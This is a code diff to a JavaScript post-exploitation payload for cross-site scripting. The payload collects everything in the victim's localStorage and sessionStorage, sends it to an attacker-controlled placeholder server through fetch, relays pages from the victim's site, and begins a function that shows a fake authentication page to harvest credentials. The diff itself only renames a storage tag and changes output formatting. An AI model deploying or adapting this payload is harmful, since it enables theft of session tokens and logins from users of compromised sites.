@@ -1,4 +1,5 @@
 const server = 'https://myserverhere/'
+const tag = 'postxss_'
 
 const send = async (info, value) => {
     fetch(server + '?meta=' + info, {
@@ -37,12 +38,13 @@ const getSubUrls = (url) => {
     return subUrls
 }
 
+
 const alreadySent = (key) => {
-    return localStorage.getItem('postxss_' + key)
+    return localStorage.getItem(tag + key)
 }
 
 const markSent = (key) => {
-    localStorage.setItem('postxss_' + key, true)
+    localStorage.setItem(tag + key, true)
 }
 
 const sendStorage = () => {
@@ -52,7 +54,7 @@ const sendStorage = () => {
     let localValues = '';
     let keys = Object.keys(localStorage);
     for (let i = keys.length-1; i >= 0; i--) {
-        localValues += keys[i] + '::' + localStorage.getItem(keys[i]) + '<<>>'
+        localValues += keys[i] + ': ' + localStorage.getItem(keys[i]) + '\n'
     }
     if (localValues.length > 0) {
         send('localStorage', localValues)
@@ -61,7 +63,7 @@ const sendStorage = () => {
     let sessionValues = ''
     keys = Object.keys(sessionStorage)
     for (let i = keys.length-1; i >= 0; i--) {
-        sessionValues += keys[i] + '::' + sessionStorage.getItem(keys[i]) + '<<>>'
+        sessionValues += keys[i] + ': ' + sessionStorage.getItem(keys[i]) + '\n'
     }
     if (sessionValues.length > 0) {
         send('sessionStorage', sessionValues)
@@ -93,7 +95,7 @@ sendPage(window.location.href)
 const locationUrls = getSubUrls(window.location.href)
 locationUrls.forEach(url => sendPage(url))
 
-//sendPage('http://victim/image.png')
+//sendPage('http://url/image.png')
 
 const displayAutenticationPage = (language = 'pt') => {
     if (alreadySent('creds')) {
